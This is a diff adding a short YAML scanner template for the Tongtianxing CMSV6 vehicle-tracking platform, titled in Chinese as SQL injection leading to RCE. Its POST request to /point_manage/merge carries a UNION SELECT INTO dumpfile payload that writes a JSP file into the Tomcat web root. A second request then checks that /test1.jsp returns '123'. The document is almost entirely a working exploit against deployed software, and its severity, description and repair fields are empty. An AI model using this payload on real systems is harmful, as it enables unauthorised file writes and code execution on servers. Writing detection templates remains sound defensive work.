@@ -1,0 +1,25 @@
+id:
+
+info:
+  name: 通天星CMSV6车载定位监控平台 point_manage_merge SQL注入致RCE
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /point_manage/merge
+  headers:
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+  data: |
+    id=1&name=1' UNION SELECT%0aNULL, 0x3039,NULL,NULL,NULL,NULL,NULL,NULL
+    INTO dumpfile '../../tomcat/webapps/gpsweb/test1.jsp' FROM user_session a
+    WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
+response1:
+requests2:
+  method: GET
+  path: /test1.jsp
+response2:
+  code: 200
+  body: 123
